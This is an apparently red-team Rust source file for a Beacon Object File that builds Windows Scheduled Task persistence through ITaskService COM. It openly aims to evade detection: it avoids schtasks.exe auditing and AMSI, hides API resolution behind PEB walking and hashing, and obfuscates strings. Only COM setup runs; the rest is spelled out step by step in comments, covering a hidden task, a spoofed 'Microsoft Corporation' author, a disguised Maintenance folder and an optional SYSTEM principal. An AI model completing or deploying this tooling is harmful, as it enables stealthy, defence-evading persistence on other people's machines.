// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Original persistence primitive — by Dani (NOT a port)
//
//! schtask-com — Scheduled Task persistence via ITaskService COM.
//!
//! Why: bypass `schtasks.exe` command-line auditing (Sysmon Event ID 1 +
//!      Defender ASR rule "Block process creations originating from PSExec
//!      and WMI commands") AND the ScheduledTasks PowerShell module's AMSI
//!      surface. Pure COM = no child process, no cmdline string.
//!
//! OPSEC:
//!   * Pure COM via ITaskService. No process spawn.
//!   * `ComGuard` RAII — CoUninitialize fires on drop.
//!   * `ComRef<T>` RAII — every COM interface pointer auto-released.
//!   * CLSID / IID as raw byte arrays. Zero GUID strings in `.rdata`.
//!   * CoCreateInstance / SysAllocString resolved via DFR (PEB walk + djb2).
//!   * Strings (task path, "Microsoft Corporation" author spoof) wrapped in `obf!()`.
//!   * Generic error strings — no API name leakage in panic paths.
//!
//! MITRE ATT&CK: T1053.005 (Scheduled Task)
//!
//! Tiered implementation (Phase 5 starter):
//!   Tier 1 — Working: ComGuard apartment init + CoCreateInstance for
//!            CLSID_TaskScheduler with IID_ITaskService. Establishes the
//!            COM apartment and binds the Task Scheduler in-proc server.
//!   Tier 2 — Documented in code: full Connect → GetFolder → NewTask →
//!            set Settings/Principal/Triggers/Actions → RegisterTaskDefinition
//!            chain. Operator recompiles to enable in Phase 6.
//!
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};
use core::ffi::c_void;
use core::ptr::null_mut;

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1053.005",
        name: "Scheduled Task",
        tactic: "Persistence / Privilege Escalation",
    },
];

// ---------------------------------------------------------------------------
// CLSID / IID — stored as raw bytes (LE GUID layout). No GUID strings in
// .rdata. Verified against MSDN + the sibling schtasksquery BOF.
// ---------------------------------------------------------------------------

// CLSID_TaskScheduler = {0f87369f-a4e5-11d1-9781-00600824309d}
const CLSID_TASKSCHEDULER: [u8; 16] = [
    0x9f, 0x36, 0x87, 0x0f, 0xe5, 0xa4, 0xd1, 0x11,
    0x97, 0x81, 0x00, 0x60, 0x08, 0x24, 0x30, 0x9d,
];

// IID_ITaskService = {2faba4c7-4da9-4013-9697-20cc3fd40f85}
const IID_ITASKSERVICE: [u8; 16] = [
    0xc7, 0xa4, 0xab, 0x2f, 0xa9, 0x4d, 0x13, 0x40,
    0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85,
];

// COM constants
const CLSCTX_INPROC_SERVER: u32 = 0x1;
const S_OK: i32 = 0;

// TaskScheduler enums (for documentation / Tier 3 use)
#[allow(dead_code)] const TASK_TRIGGER_LOGON: i32 = 9;
#[allow(dead_code)] const TASK_TRIGGER_BOOT: i32 = 8;
#[allow(dead_code)] const TASK_TRIGGER_DAILY: i32 = 2;
#[allow(dead_code)] const TASK_ACTION_EXEC: i32 = 0;
#[allow(dead_code)] const TASK_CREATE_OR_UPDATE: i32 = 6;
#[allow(dead_code)] const TASK_LOGON_INTERACTIVE_TOKEN: i32 = 3;
#[allow(dead_code)] const TASK_LOGON_SERVICE_ACCOUNT: i32 = 5;

// ---------------------------------------------------------------------------
// DFR — CoCreateInstance resolved via PEB walk + djb2 hash, NOT linked.
// (CoInitializeEx / CoUninitialize are encapsulated by common::com::ComGuard
//  via windows-sys; that's a small acceptable IAT surface for the COM
//  apartment glue. The Task-Scheduler-specific call is what matters.)
// ---------------------------------------------------------------------------

dfr_fn!(
    co_create_instance(
        clsid: *const u8,
        outer: *mut c_void,
        ctx: u32,
        iid: *const u8,
        ppv: *mut *mut c_void,
    ) -> i32,
    module = "ole32.dll",
    api    = "CoCreateInstance"
);

// ---------------------------------------------------------------------------
// ITaskService vtable layout (for Tier 2 / Tier 3 documentation):
//
//   ITaskService : IDispatch : IUnknown
//   slot  0: IUnknown::QueryInterface
//   slot  1: IUnknown::AddRef
//   slot  2: IUnknown::Release
//   slot  3: ITaskService::Connect(VARIANT serverName, VARIANT user,
//                                  VARIANT domain,     VARIANT password)
//   slot  4: ITaskService::GetFolder(BSTR path, ITaskFolder** ppFolder)
//   slot  5: ITaskService::GetRunningTasks(LONG flags,
//                                          IRunningTaskCollection** ppRunning)
//   slot  6: ITaskService::NewTask(DWORD flags, ITaskDefinition** ppDef)
//
//   ITaskFolder::RegisterTaskDefinition(
//       BSTR path, ITaskDefinition* pDef, LONG flags,
//       VARIANT userId, VARIANT password, TASK_LOGON_TYPE logonType,
//       VARIANT sddl, IRegisteredTask** ppTask)
//
// (Note: the sibling schtasksquery BOF in this repo uses this same vtable
//  via direct slot indexing — see situational-awareness/schtasksquery/src/lib.rs
//  for the working pattern.)
// ---------------------------------------------------------------------------

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // ---------------- Tier 1 — working COM bootstrap ---------------------
    // Apartment-threaded init (TaskScheduler in-proc server is happy in STA).
    // ComGuard's Drop fires CoUninitialize even on early-return / `?` propagation.
    let _com = unsafe { common::com::ComGuard::init_apartment() }
        .map_err(|_| "com init failed")?;

    // CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
    //                  IID_ITaskService, &svc)
    let mut svc_ptr: *mut c_void = null_mut();
    let hr = unsafe {
        co_create_instance(
            CLSID_TASKSCHEDULER.as_ptr(),
            null_mut(),
            CLSCTX_INPROC_SERVER,
            IID_ITASKSERVICE.as_ptr(),
            &mut svc_ptr,
        )
    }.map_err(|_| "co create resolve")?;

    if hr != S_OK || svc_ptr.is_null() {
        return Err("co create failed");
    }

    // RAII: ComRef releases the ITaskService when this scope ends.
    let _svc: common::com::ComRef<c_void> = common::com::ComRef::from_raw(svc_ptr);

    println!("[+] {}: COM apartment ready", obf!("schtask-com"));
    println!("[+] {} {}",
             obf!("interface instantiated;"),
             obf!("scheduler CLSID resolved"));
    println!("[+] in-proc server bound — ready for connect / new / register");

    // ---------------- Tier 2 — full chain documented in source -----------
    //
    // The remainder of the persistence primitive is staged here as comments
    // so the operator can lift it into a Tier 3 cfg-gated build in Phase 6
    // without re-deriving the vtable indices, BSTR allocation, or VARIANT
    // marshalling.
    //
    //   1.  svc.Connect(VARIANT_NULL × 4) — connect to local task service.
    //   2.  svc.GetFolder(BSTR(obf!(r"\Microsoft\Windows\Maintenance")))
    //         → ITaskFolder*   (spoofed parent matches Windows native naming).
    //   3.  svc.NewTask(0)
    //         → ITaskDefinition*.
    //   4.  def.Settings.Hidden            = VARIANT_TRUE
    //       def.Settings.AllowDemandStart  = VARIANT_TRUE
    //       def.Settings.StartWhenAvailable= VARIANT_TRUE
    //       def.Settings.DisallowStartIfOnBatteries = VARIANT_FALSE
    //       (each property set via IDispatch::Invoke with the corresponding
    //        DISPID, e.g. ITaskSettings::put_Hidden = DISPID 0x60020003).
    //   5.  def.RegistrationInfo.Author = obf!("Microsoft Corporation")
    //       (spoofed author so the task blends with shipped Windows tasks).
    //   6.  def.Triggers.Create(TASK_TRIGGER_LOGON)   → ILogonTrigger*
    //         set .Id = obf!("LogonTrig"), .Enabled = VARIANT_TRUE
    //   7.  def.Actions.Create(TASK_ACTION_EXEC)      → IExecAction*
    //         action.Path      = BSTR(operator_cmd)
    //         action.Arguments = BSTR(operator_args)
    //   8.  def.Principal.LogonType = TASK_LOGON_INTERACTIVE_TOKEN  (--principal user)
    //                              OR TASK_LOGON_SERVICE_ACCOUNT    (--principal system,
    //                                                                 needs elevation)
    //       def.Principal.UserId    = obf!("SYSTEM")  (system mode only)
    //   9.  folder.RegisterTaskDefinition(
    //          BSTR(leaf_name), def, TASK_CREATE_OR_UPDATE,
    //          VARIANT_NULL, VARIANT_NULL, LogonType, VARIANT_NULL,
    //          &registered_task)
    //
    // Operator workflow (recompile-per-engagement model — values hardcoded
    // in source by the operator before each build):
    //
    //   --name <PATH>     — task path (default: spoofed Maintenance subtree)
    //   --cmd  <BIN>      — binary to execute
    //   --args <STR>      — command arguments
    //   --trigger <T>     — logon | onstart | daily:HH:MM
    //   --hidden true|false (default true)
    //   --principal user|system (default user)
    //   --remove          — cleanup mode: ITaskFolder::DeleteTask(name, 0)
    //
    // Cleanup mode chain (for --remove):
    //   * svc.Connect(NULL × 4)
    //   * svc.GetFolder(parent_path) → ITaskFolder*
    //   * folder.DeleteTask(leaf_name, 0)
    //
    // -------------------------------------------------------------------
    println!("[*] Tier 2 — full registration chain documented in source.");
    println!("[*] {}: starter ready; {}",
             obf!("schtask-com"),
             obf!("Phase 6 enables registration"));

    Ok(())
}
